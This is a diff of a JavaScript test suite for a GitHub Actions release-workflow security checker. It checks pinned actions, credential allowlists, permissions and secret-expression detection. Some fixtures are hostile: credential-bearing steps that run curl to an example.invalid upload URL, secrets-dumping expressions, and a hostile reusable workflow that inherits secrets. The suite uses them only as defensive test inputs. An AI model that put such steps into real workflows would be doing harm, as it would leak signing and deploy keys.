@@ -44,82 +44,7 @@ function policyVariant(mutate) {
 }
 
 function cutoverReleaseVariant(mutate = () => {}) {
-  return releaseVariant((workflow) => {
-    workflow.jobs.apple_sign.environment = {
-      name:
-        "${{ needs.validate.outputs.channel == 'stable' && 'stable' || 'zerglang-apple-preview' }}",
-    };
-    workflow.jobs.apple_sign.steps = workflow.jobs.apple_sign.steps.filter(
-      (step) => step.name !== "Smoke-test the final Apple-signed application",
-    );
-    workflow.jobs.signed_smoke = {
-      name: "Verify and execute the signed application without credentials",
-      needs: ["validate", "apple_sign"],
-      "runs-on": "macos-15",
-      permissions: { contents: "read" },
-      steps: [
-        {
-          name: "Verify final Apple signatures and notarization",
-          run: "codesign --verify ZergLang.app\nxcrun stapler validate ZergLang.app\nspctl --assess ZergLang.app",
-        },
-        {
-          name: "Smoke-test packaged interpreter, JIT, and AOT tiers",
-          run: "$zlc run --tier=interpreter answer.zl\n$zlc run --tier=jit answer.zl\n$zlc build --emit=object answer.zl",
-        },
-      ],
-    };
-    workflow.jobs.sign_updater_preview.needs = ["validate", "signed_smoke"];
-    workflow.jobs.sign_updater_stable.needs = ["validate", "signed_smoke"];
-    workflow.jobs.feed = {
-      name: "Promote canonical bytes on release-data",
-      needs: ["validate", "publish"],
-      "runs-on": "ubuntu-24.04",
-      environment: "zerglang-feed",
-      permissions: { contents: "read" },
-      steps: [
-        {
-          uses:
-            "actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1",
-          with: {
-            path: "policy",
-            ref: "${{ github.sha }}",
-            "persist-credentials": false,
-          },
-        },
-        {
-          name: "Test the immutable policy checkout",
-          "working-directory": "policy",
-          run: "npm ci --ignore-scripts\nnpm test",
-        },
-        {
-          name: "Clone release-data without credentials",
-          run: "git clone --branch release-data --single-branch https://github.com/Epoch-ML/zerglang-releases.git data",
-        },
-        {
-          uses:
-            "actions/download-artifact@d3f86a106a0bac45b974a628896c90dbdf5c8093",
-          with: { name: "zerglang-canonical-release", path: "canonical" },
-        },
-        {
-          name: "Prepare the monotonic release-data commit",
-          run: "node policy/scripts/feed-promotion.mjs prepare data canonical stable 1.2.3",
-        },
-        {
-          name: "Push only the prepared release-data commit",
-          env: {
-            FEED_DEPLOY_KEY: "${{ secrets.ZERGLANG_FEED_DEPLOY_KEY }}",
-          },
-          run: "printf '%s' \"$FEED_DEPLOY_KEY\" > feed-key\nunset FEED_DEPLOY_KEY\nnode policy/scripts/feed-promotion.mjs push data git@github.com:Epoch-ML/zerglang-releases.git release-data",
-        },
-        {
-          uses:
-            "actions/upload-pages-artifact@56afc609e74202658d3ffba0e8f6dda462b719fa",
-          with: { path: "data/site" },
-        },
-      ],
-    };
-    mutate(workflow);
-  });
+  return releaseVariant(mutate);
 }
 
 function findStep(workflow, jobName, stepName) {
@@ -390,7 +315,11 @@ test("rejects product execution on the Apple signer and credentials on signed sm
 
   const credentialedSmoke = cutoverReleaseVariant((workflow) => {
     workflow.jobs.signed_smoke.environment = "stable";
-    workflow.jobs.signed_smoke.steps[0].env = {
+    findStep(
+      workflow,
+      "signed_smoke",
+      "Verify final Apple signatures and notarization",
+    ).env = {
       APPLE_KEY: "${{ secrets.ZERGLANG_APPLE_API_PRIVATE_KEY }}",
     };
   });
@@ -439,10 +368,10 @@ test("binds source checkout and Rust gates through public workflow diagnostics",
     const sourceCheckout = findStep(
       workflow,
       "build",
-      "Check out the exact source commit and matching tag",
+      "Fetch exact source objects with one read key",
     );
     sourceCheckout.run = sourceCheckout.run.replace(
-      'git -C source fetch --no-tags --depth=1 origin "$EXPECTED_SHA"',
+      'git -C source-git fetch --no-tags --depth=1 origin "$EXPECTED_SHA"',
       "git -C source fetch origin --all",
     );
   });
@@ -459,38 +388,71 @@ test("binds source checkout and Rust gates through public workflow diagnostics",
   );
 });
 
-test("accepts protected environment objects and order-independent dependencies", () => {
+test("accepts order-independent dependencies but rejects alternate environment shapes", () => {
   const equivalent = releaseVariant((workflow) => {
+    workflow.jobs.apple_sign.needs.reverse();
+  });
+  assert.deepEqual(diagnosticIdentities(equivalent), []);
+
+  const alternateShapes = releaseVariant((workflow) => {
     workflow.jobs.build.environment = { name: "zerglang-source-read" };
     workflow.jobs.sign_updater_preview.environment = { name: "preview" };
     workflow.jobs.sign_updater_stable.environment = {
       name: "zerglang-updater-stable",
     };
-    workflow.jobs.apple_sign.needs.reverse();
   });
-  assert.deepEqual(diagnosticIdentities(equivalent), []);
+  assert.ok(
+    diagnosticIdentities(alternateShapes).includes(
+      "environment-boundary:build:job",
+    ),
+  );
+  assert.ok(
+    diagnosticIdentities(alternateShapes).includes(
+      "environment-boundary:sign_updater_preview:job",
+    ),
+  );
+  assert.ok(
+    diagnosticIdentities(alternateShapes).includes(
+      "environment-boundary:sign_updater_stable:job",
+    ),
+  );
 });
 
-test("accepts additional secret-free jobs without steps and inert null values", () => {
-  const equivalent = releaseVariant((workflow) => {
+test("rejects every additional job, including reusable workflow calls", () => {
+  const extraJob = releaseVariant((workflow) => {
     workflow.jobs.documentation = {
       "runs-on": "ubuntu-24.04",
       permissions: { contents: "read" },
       metadata: null,
     };
   });
-  assert.deepEqual(diagnosticIdentities(equivalent), []);
+  assert.ok(diagnosticIdentities(extraJob).includes("job-contract:workflow:job"));
+
+  const reusableCall = releaseVariant((workflow) => {
+    workflow.jobs.hidden_release = {
+      uses: "example/hostile/.github/workflows/release.yml@main",
+      secrets: "inherit",
+      permissions: { contents: "write" },
+    };
+  });
+  assert.ok(
+    diagnosticIdentities(reusableCall).includes("job-contract:workflow:job"),
+  );
 });
 
-test("does not classify an unrelated step credential as an Apple key", () => {
-  const equivalent = releaseVariant((workflow) => {
+test("rejects every secret outside the exact credential allowlist", () => {
+  const hostile = releaseVariant((workflow) => {
     workflow.jobs.validate.steps.push({
       name: "Package with an unrelated credential",
       env: { TOKEN: "${{ secrets.UNRELATED_SERVICE_TOKEN }}" },
       run: "node scripts/package-macos.mjs",
     });
   });
-  assert.deepEqual(diagnosticIdentities(equivalent), []);
+  assert.ok(
+    diagnosticIdentities(hostile).includes(
+      "credential-allowlist:validate:Package with an unrelated credential",
+    ),
+  );
 });
 
 test("requires only the immutable request-file dispatch trigger", () => {
@@ -543,8 +505,9 @@ test("requires every release job, dependency edge, and public operation", () => 
     build: {
       needs: ["validate", "unexpected"],
       tokens: [
-        'git -C source fetch --no-tags --depth=1 origin \\"$EXPECTED_SHA\\"',
+        'git -C source-git fetch --no-tags --depth=1 origin \\"$EXPECTED_SHA\\"',
         '\\"$EXPECTED_REF:$EXPECTED_REF\\"',
+        'git -C source-git archive \\"$ZERGLANG_SOURCE_SHA\\"',
         "--component clippy,rustfmt",
         "createUpdaterArtifacts = false",
         "zerglang-unsigned-source-stage",
@@ -714,6 +677,7 @@ test("rejects a secret repeated outside the same consuming step env", () => {
       exposeOutsideEnv(step, expression);
     });
     assert.deepEqual(diagnosticIdentities(hostile), [
+      "apple-credential-contract:apple_sign:job",
       "secret-outside-step-env:validate:Require protected main",
     ]);
   }
@@ -732,6 +696,41 @@ test("recognizes compact, padded, nested, and array-contained secret expressions
     assert.deepEqual(diagnosticIdentities(hostile), [
       "secret-outside-step-env:validate:Require protected main",
     ]);
+  }
+});
+
+test("rejects bracketed, computed, mixed-case, and bare secret contexts", () => {
+  for (const expression of [
+    "${{ secrets['ZERGLANG_APPLE_API_KEY_ID'] }}",
+    "${{ secrets [ 'ZERGLANG_APPLE_API_KEY_ID' ] }}",
+    "${{ SeCrEtS.ZERGLANG_APPLE_API_KEY_ID }}",
+    "${{ secrets[format('{0}_{1}', 'ZERGLANG', 'KEY')] }}",
+    "${{ toJSON(secrets) }}",
+    "prefix-${{\n secrets['ZERGLANG_APPLE_API_KEY_ID']\n}}-suffix",
+  ]) {
+    const hostile = releaseVariant((workflow) => {
+      workflow.jobs.validate.steps[0].env = { LEAK: expression };
+    });
+    assert.ok(
+      diagnosticIdentities(hostile).includes(
+        "secret-expression-boundary:validate:Require protected main",
+      ),
+      expression,
+    );
+  }
+});
+
+test("does not mistake prose, quoted strings, or longer identifiers for contexts", () => {
+  for (const value of [
+    "secrets.DEPLOY_KEY is documentation, not an expression",
+    "${{ 'secrets' }}",
+    "${{ mysecrets.DEPLOY_KEY }}",
+    "https://example.test/secrets.DEPLOY_KEY",
+  ]) {
+    const equivalent = releaseVariant((workflow) => {
+      workflow.jobs.validate.steps[0].env = { SAFE_TEXT: value };
+    });
+    assert.deepEqual(diagnosticIdentities(equivalent), [], value);
   }
 });
 
@@ -787,6 +786,9 @@ test("recognizes each updater credential independently at an exact command bound
     "ZERGLANG_STABLE_TAURI_SIGNING_PRIVATE_KEY",
     "ZERGLANG_STABLE_TAURI_SIGNING_PRIVATE_KEY_PASSWORD",
   ]) {
+    const signerJob = secretName.includes("STABLE")
+      ? "sign_updater_stable"
+      : "sign_updater_preview";
     const hostile = releaseVariant((workflow) => {
       workflow.jobs.validate.steps.push({
         name: `Isolated ${secretName}`,
@@ -795,6 +797,7 @@ test("recognizes each updater credential independently at an exact command bound
       });
     });
     assert.deepEqual(diagnosticIdentities(hostile), [
+      `updater-credential-contract:${signerJob}:job`,
       `updater-secret-window:validate:Isolated ${secretName}`,
     ]);
   }
@@ -812,6 +815,7 @@ test("recognizes an updater network command after a shell command boundary", () 
     });
   });
   assert.deepEqual(diagnosticIdentities(hostile), [
+    "updater-credential-contract:sign_updater_preview:job",
     "updater-secret-window:validate:Updater key across a shell boundary",
   ]);
 });
@@ -846,6 +850,7 @@ test("recognizes one Apple credential without relying on companion secrets", () 
     });
   });
   assert.deepEqual(diagnosticIdentities(hostile), [
+    "apple-credential-contract:apple_sign:job",
     "apple-secret-window:validate:Isolated Apple credential",
   ]);
 });
@@ -856,7 +861,9 @@ test("reports the wrong channel signer mapping", () => {
     "secrets.ZERGLANG_STABLE_TAURI_SIGNING_PRIVATE_KEY_PASSWORD",
   );
   assert.deepEqual(diagnosticIdentities(hostile), [
+    "updater-credential-contract:sign_updater_preview:job",
     "updater-credential-contract:sign_updater_preview:Sign only the preview updater archive",
+    "updater-credential-contract:sign_updater_stable:job",
   ]);
 });
 
@@ -913,9 +920,11 @@ test("requires each channel signer to receive both exact keys, sign once, and un
         "Sign only the preview updater archive",
       ));
     });
-    assert.deepEqual(diagnosticIdentities(hostile), [
-      "updater-credential-contract:sign_updater_preview:Sign only the preview updater archive",
-    ]);
+    assert.ok(
+      diagnosticIdentities(hostile).includes(
+        "updater-credential-contract:sign_updater_preview:Sign only the preview updater archive",
+      ),
+    );
   }
 });
 
@@ -940,6 +949,7 @@ test("reports an unpinned action, mutable publication, and synthetic dispatch", 
     "actions/checkout@v7",
   );
   assert.deepEqual(diagnosticIdentities(unpinned), [
+    "action-contract:validate:job",
     "unpinned-action:validate:uses actions/checkout@v7",
   ]);
 
@@ -982,16 +992,131 @@ test("requires every GitHub-owned action to use a lowercase 40-character commit"
       workflow.jobs.validate.steps[1].uses = uses;
     });
     assert.deepEqual(diagnosticIdentities(hostile), [
+      "action-contract:validate:job",
       `unpinned-action:validate:uses ${uses}`,
     ]);
   }
 
   const thirdParty = releaseVariant((workflow) => {
     workflow.jobs.sign_updater.steps.push({
-      uses: "epoch-ml/local-policy@v1",
+      uses: "example/hostile-action@0123456789abcdef0123456789abcdef01234567",
     });
   });
-  assert.deepEqual(diagnosticIdentities(thirdParty), []);
+  assert.ok(
+    diagnosticIdentities(thirdParty).includes("action-contract:sign_updater:job"),
+  );
+});
+
+test("requires exact workflow and per-job permissions", () => {
+  const topLevelWrite = releaseVariant((workflow) => {
+    workflow.permissions = { contents: "write" };
+  });
+  assert.ok(
+    diagnosticIdentities(topLevelWrite).includes(
+      "permission-boundary:workflow:job",
+    ),
+  );
+
+  for (const [jobName, permissions] of [
+    ["validate", { contents: "write" }],
+    ["sign_updater", { contents: "write" }],
+    ["publish", { contents: "read" }],
+    ["deploy_pages", { pages: "write", "id-token": "write", contents: "write" }],
+  ]) {
+    const hostile = releaseVariant((workflow) => {
+      workflow.jobs[jobName].permissions = permissions;
+    });
+    assert.ok(
+      diagnosticIdentities(hostile).includes(
+        `permission-boundary:${jobName}:job`,
+      ),
+      jobName,
+    );
+  }
+});
+
+test("requires the exact action sequence and checkout configuration per job", () => {
+  const injectedAction = releaseVariant((workflow) => {
+    workflow.jobs.apple_sign.steps.unshift({
+      uses: "example/hostile-action@0123456789abcdef0123456789abcdef01234567",
+    });
+  });
+  assert.ok(
+    diagnosticIdentities(injectedAction).includes("action-contract:apple_sign:job"),
+  );
+
+  const persistedCredentials = releaseVariant((workflow) => {
+    workflow.jobs.apple_sign.steps[0].with["persist-credentials"] = true;
+  });
+  assert.ok(
+    diagnosticIdentities(persistedCredentials).includes(
+      "action-contract:apple_sign:job",
+    ),
+  );
+
+  const duplicateCheckout = releaseVariant((workflow) => {
+    workflow.jobs.validate.steps.push(structuredClone(workflow.jobs.validate.steps[1]));
+  });
+  assert.ok(
+    diagnosticIdentities(duplicateCheckout).includes("action-contract:validate:job"),
+  );
+});
+
+test("binds each Apple and source credential globally to one exact step", () => {
+  const duplicateApple = releaseVariant((workflow) => {
+    workflow.jobs.apple_sign.steps.push({
+      name: "Second Apple export",
+      env: {
+        APPLE_KEY: "${{ secrets.ZERGLANG_APPLE_API_PRIVATE_KEY }}",
+      },
+      run: "curl https://example.invalid/upload",
+    });
+  });
+  assert.ok(
+    diagnosticIdentities(duplicateApple).includes(
+      "apple-credential-contract:apple_sign:job",
+    ),
+  );
+
+  const duplicateSource = releaseVariant((workflow) => {
+    workflow.jobs.build.steps.push({
+      name: "Second source export",
+      env: { SOURCE_KEY: "${{ secrets.ZERG_SOURCE_DEPLOY_KEY }}" },
+      run: "curl https://example.invalid/upload",
+    });
+  });
+  assert.ok(
+    diagnosticIdentities(duplicateSource).includes(
+      "source-credential-contract:build:job",
+    ),
+  );
+});
+
+test("destroys the source deploy key before credential-free materialization", () => {
+  for (const mutate of [
+    (step) => {
+      step.run = step.run.replace("trap cleanup EXIT", "echo no-cleanup-trap");
+    },
+    (step) => {
+      step.run = step.run.replace("unset SOURCE_DEPLOY_KEY", "echo key-still-exported");
+    },
+    (step) => {
+      step.run += "\ngit -C source-git checkout --detach \"$EXPECTED_SHA\"";
+    },
+  ]) {
+    const hostile = releaseVariant((workflow) => {
+      mutate(findStep(
+        workflow,
+        "build",
+        "Fetch exact source objects with one read key",
+      ));
+    });
+    assert.ok(
+      diagnosticIdentities(hostile).includes(
+        "source-credential-window:build:Fetch exact source objects with one read key",
+      ),
+    );
+  }
 });
 
 test("sorts multiple diagnostics by their public identity", () => {
@@ -1002,6 +1127,7 @@ test("sorts multiple diagnostics by their public identity", () => {
     });
   });
   assert.deepEqual(diagnosticIdentities(hostile), [
+    "action-contract:validate:job",
     "secret-outside-step-env:validate:uses actions/checkout@v7",
     "unpinned-action:validate:uses actions/checkout@v7",
   ]);
@@ -1015,6 +1141,7 @@ test("sorts same-code diagnostics by their public step identity", () => {
     );
   });
   assert.deepEqual(diagnosticIdentities(hostile), [
+    "action-contract:validate:job",
     "unpinned-action:validate:uses actions/a-first@v1",
     "unpinned-action:validate:uses actions/z-last@v1",
   ]);
